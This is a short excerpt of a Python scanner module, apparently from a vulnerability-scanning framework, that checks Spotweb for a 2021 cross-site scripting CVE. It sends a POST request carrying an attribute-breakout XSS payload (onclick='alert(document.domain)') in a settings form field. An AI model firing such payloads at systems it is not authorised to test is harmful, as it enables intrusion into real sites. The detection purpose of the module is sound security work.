...
class Module(Scanner, Http_client):
    __info__ = {
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'spotweb', 'spotweb_project', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        ...
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="settingsform[mail]=pdteam'+onclick='alert(document.domain)\n")
